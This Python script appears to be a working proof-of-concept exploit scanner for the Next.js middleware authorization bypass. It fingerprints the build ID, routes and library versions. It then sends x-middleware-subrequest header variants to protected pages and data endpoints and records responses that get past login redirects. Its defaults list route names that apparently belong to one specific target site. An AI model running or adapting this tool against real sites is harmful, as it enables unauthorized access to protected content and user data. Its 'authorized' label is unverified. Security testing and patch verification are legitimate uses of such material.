#!/usr/bin/env python3
import argparse
import ast
import hashlib
import html
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.request

HEADER_VARIANTS = [
    "middleware",
    "src/middleware",
    "pages/_middleware",
    "_middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

DEFAULT_MATCHER_ROOTS = [
    "onboarding",
    "offers",
    "issuance",
    "data-platform",
    "data-platform/sigma-api",
    "snap",
]

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def make_opener(insecure=False):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        NoRedirect,
    )

def join_url(base, path):
    return base.rstrip("/") + (path if path.startswith("/") else "/" + path)

def fetch(opener, base, path, headers=None, timeout=20, limit=300000):
    headers = dict(headers or {})
    headers.setdefault("User-Agent", "authorized-nextjs-poc-scanner/1.0")
    headers.setdefault("Accept", "application/json,text/html,*/*")

    url = join_url(base, path)
    row = {
        "path": path,
        "status": None,
        "location": None,
        "content_type": None,
        "cache_control": None,
        "x_nextjs_matched_path": None,
        "body_len": 0,
        "sha256_16": None,
        "body_preview": "",
        "json_redirect": None,
        "json_keys": [],
        "error": None,
    }

    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(limit)
            update_row(row, resp, body)
    except urllib.error.HTTPError as exc:
        body = exc.read(limit)
        update_row(row, exc, body)
    except Exception as exc:
        row["error"] = f"{type(exc).__name__}: {exc}"

    return row

def update_row(row, resp, body):
    text = body.decode("utf-8", errors="replace")
    row["status"] = resp.getcode()
    row["location"] = resp.headers.get("Location")
    row["content_type"] = resp.headers.get("Content-Type")
    row["cache_control"] = resp.headers.get("Cache-Control")
    row["x_nextjs_matched_path"] = resp.headers.get("x-nextjs-matched-path")
    row["body_len"] = len(body)
    row["sha256_16"] = hashlib.sha256(body).hexdigest()[:16]
    row["body_preview"] = re.sub(r"\s+", " ", text[:300]).strip()

    if (row["content_type"] or "").lower().startswith("application/json"):
        try:
            parsed = json.loads(text)
            if isinstance(parsed, dict):
                row["json_keys"] = sorted(parsed.keys())
                pp = parsed.get("pageProps", {})
                if isinstance(pp, dict):
                    row["json_redirect"] = pp.get("__N_REDIRECT")
        except Exception:
            pass

def fetch_text(opener, base, path, timeout=20):
    row = fetch(opener, base, path, timeout=timeout, limit=1000000)
    try:
        req = urllib.request.Request(join_url(base, path), headers={"User-Agent": "authorized-nextjs-poc-scanner/1.0"})
        with opener.open(req, timeout=timeout) as resp:
            return resp.read(1000000).decode("utf-8", errors="replace"), row
    except urllib.error.HTTPError as exc:
        return exc.read(1000000).decode("utf-8", errors="replace"), row
    except Exception:
        return "", row

def extract_next_data(html_text):
    m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', html_text, re.I | re.S)
    if not m:
        return {}
    try:
        return json.loads(html.unescape(m.group(1)))
    except Exception:
        return {}

def detect_build(opener, base, timeout):
    for path in ["/__codex_nextjs_probe_404_4513", "/404", "/terms-and-conditions", "/snap"]:
        text, _ = fetch_text(opener, base, path, timeout)
        data = extract_next_data(text)
        if data.get("buildId"):
            return data
    return {}

def fetch_build_manifest(opener, base, build_id, timeout):
    if not build_id:
        return ""
    text, _ = fetch_text(opener, base, f"/_next/static/{build_id}/_buildManifest.js", timeout)
    return text

def extract_routes(manifest_text):
    m = re.search(r"sortedPages:\[(.*?)\]\}\}", manifest_text)
    if not m:
        return []
    try:
        return ast.literal_eval("[" + m.group(1) + "]")
    except Exception:
        return []

def extract_versions(opener, base, timeout):
    text, _ = fetch_text(opener, base, "/__codex_nextjs_probe_404_4513", timeout)
    assets = sorted(set(re.findall(r'["\'](/_next/static/[^"\']+?\.js)["\']', text)))
    versions = {}
    for asset in assets:
        js, _ = fetch_text(opener, base, asset, timeout)
        for pkg in ["next/dynamic", "next/head", "next/link", "next/router", "react", "react-dom"]:
            m = re.search(re.escape(pkg) + r'","([^"]+)"', js)
            if m:
                versions[pkg] = m.group(1)
        if "next/router" in versions and "react" in versions:
            break
    return versions

def blocked(row):
    if row["status"] in [301, 302, 303, 307, 308, 401, 403]:
        return True
    if row.get("json_redirect"):
        return True
    return False

def content(row):
    if row["status"] != 200:
        return False
    if row.get("json_redirect"):
        return False
    preview = (row.get("body_preview") or "").lower()
    bad = [
        "api/auth/login",
        "request rejected",
        "bad gateway",
        "this page could not be found",
        "404:",
        "500:",
        "internal server error",
    ]
    if any(x in preview for x in bad):
        return False
    return row["body_len"] > 50

def route_to_data_paths(route, build_id, locales):
    if not build_id:
        return []

    route = "/" + route.strip("/")
    if "[" in route or "]" in route or route in ["/_app", "/_error"]:
        return []

    paths = []
    clean = route.strip("/")

    if clean == "":
        paths.append(f"/_next/data/{build_id}/index.json")
        for loc in locales:
            paths.append(f"/_next/data/{build_id}/{loc}.json")
            paths.append(f"/_next/data/{build_id}/{loc}/index.json")
        return paths

    parts = clean.split("/", 1)
    if parts[0] in locales:
        loc = parts[0]
        rest = parts[1] if len(parts) > 1 else "index"
        paths.append(f"/_next/data/{build_id}/{loc}/{rest}.json")
    else:
        paths.append(f"/_next/data/{build_id}/{clean}.json")
        for loc in locales:
            paths.append(f"/_next/data/{build_id}/{loc}/{clean}.json")

    return paths

def dedupe(items):
    seen, out = set(), []
    for item in items:
        if item and item not in seen:
            seen.add(item)
            out.append(item)
    return out

def test_path(opener, base, path, cookie, timeout, delay, is_data=False):
    base_headers = {}
    if is_data:
        base_headers["x-nextjs-data"] = "1"

    unauth_base = fetch(opener, base, path, headers=base_headers, timeout=timeout)
    time.sleep(delay)

    auth_base = None
    if cookie:
        auth_headers = dict(base_headers)
        auth_headers["Cookie"] = cookie
        auth_base = fetch(opener, base, path, headers=auth_headers, timeout=timeout)
        time.sleep(delay)

    attempts = []
    hits = []

    for hv in HEADER_VARIANTS:
        h = dict(base_headers)
        h["x-middleware-subrequest"] = hv
        row = fetch(opener, base, path, headers=h, timeout=timeout)
        attempts.append({"header": hv, "response": row})

        if blocked(unauth_base) and content(row):
            hit = {"header": hv, "response": row}
            if auth_base:
                hit["auth_reference_status"] = auth_base["status"]
                hit["auth_reference_hash"] = auth_base["sha256_16"]
                hit["same_hash_as_auth"] = row["sha256_16"] == auth_base["sha256_16"]
            hits.append(hit)

        time.sleep(delay)

    return {
        "path": path,
        "is_data": is_data,
        "unauth_baseline": unauth_base,
        "auth_baseline": auth_base,
        "attempts": attempts,
        "working_poc": bool(hits),
        "hits": hits,
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--start", default="/snap")
    ap.add_argument("--build-id", default="")
    ap.add_argument("--cookie", default="", help='Raw Cookie header value: "a=b; c=d"')
    ap.add_argument("--locale", action="append", default=[])
    ap.add_argument("--route", action="append", default=[])
    ap.add_argument("--matcher-root", action="append", default=[])
    ap.add_argument("--all-routes", action="store_true")
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--delay", type=float, default=0.15)
    ap.add_argument("--out", default="nextjs_poc_results")
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()

    opener = make_opener(args.insecure)
    os.makedirs(args.out, exist_ok=True)

    next_data = detect_build(opener, args.base, args.timeout)
    build_id = args.build_id or next_data.get("buildId", "")
    locales = args.locale or next_data.get("locales") or ["en", "fr"]
    default_locale = next_data.get("defaultLocale")
    if default_locale and default_locale not in locales:
        locales.insert(0, default_locale)
    locales = dedupe(locales)

    manifest_text = fetch_build_manifest(opener, args.base, build_id, args.timeout)
    manifest_routes = extract_routes(manifest_text)
    versions = extract_versions(opener, args.base, args.timeout)

    route_paths = [args.start]
    if args.all_routes:
        route_paths.extend([r for r in manifest_routes if not r.startswith("/_")])

    matcher_roots = args.matcher_root or DEFAULT_MATCHER_ROOTS
    for root in matcher_roots:
        root = root.strip("/")
        route_paths.append("/" + root)
        for loc in locales:
            route_paths.append(f"/{loc}/{root}")

    for r in args.route:
        route_paths.append(r)

    route_paths = dedupe(route_paths)

    data_paths = []
    for r in route_paths:
        data_paths.extend(route_to_data_paths(r, build_id, locales))
    data_paths = dedupe(data_paths)

    route_results = []
    data_results = []

    for p in route_paths:
        route_results.append(test_path(opener, args.base, p, args.cookie, args.timeout, args.delay, False))

    for p in data_paths:
        data_results.append(test_path(opener, args.base, p, args.cookie, args.timeout, args.delay, True))

    result = {
        "target": args.base,
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "build_id": build_id,
        "locales": locales,
        "versions": versions,
        "cookie_supplied": bool(args.cookie),
        "manifest_route_count": len(manifest_routes),
        "tested_route_count": len(route_results),
        "tested_data_route_count": len(data_results),
        "route_working_poc_count": sum(1 for x in route_results if x["working_poc"]),
        "data_working_poc_count": sum(1 for x in data_results if x["working_poc"]),
        "route_results": route_results,
        "data_results": data_results,
    }

    json_path = os.path.join(args.out, "results.json")
    md_path = os.path.join(args.out, "summary.md")

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2)

    with open(md_path, "w", encoding="utf-8") as f:
        f.write("# Next.js Actual PoC Results\n\n")
        f.write(f"Target: `{args.base}`\n\n")
        f.write(f"Build ID: `{build_id}`\n\n")
        f.write(f"Locales: `{', '.join(locales)}`\n\n")
        if versions:
            f.write("Versions:\n\n")
            for k, v in versions.items():
                f.write(f"- `{k}`: `{v}`\n")
            f.write("\n")
        f.write(f"Cookie supplied: `{bool(args.cookie)}`\n\n")
        f.write(f"Route working PoCs: `{result['route_working_poc_count']}`\n\n")
        f.write(f"Data-route working PoCs: `{result['data_working_poc_count']}`\n\n")

        f.write("## Data Route Samples\n\n")
        for item in data_results[:30]:
            b = item["unauth_baseline"]
            a = item["auth_baseline"]
            f.write(
                f"- `{item['path']}` unauth=`{b['status']}` "
                f"json_redirect=`{b['json_redirect']}`"
            )
            if a:
                f.write(
                    f" auth=`{a['status']}` auth_redirect=`{a['json_redirect']}` "
                    f"auth_hash=`{a['sha256_16']}`"
                )
            f.write(f" working_poc=`{item['working_poc']}`\n")

    print(json.dumps({
        "target": args.base,
        "build_id": build_id,
        "locales": locales,
        "versions": versions,
        "route_working_poc_count": result["route_working_poc_count"],
        "data_working_poc_count": result["data_working_poc_count"],
        "json": json_path,
        "summary": md_path,
    }, indent=2))

if __name__ == "__main__":
    main()
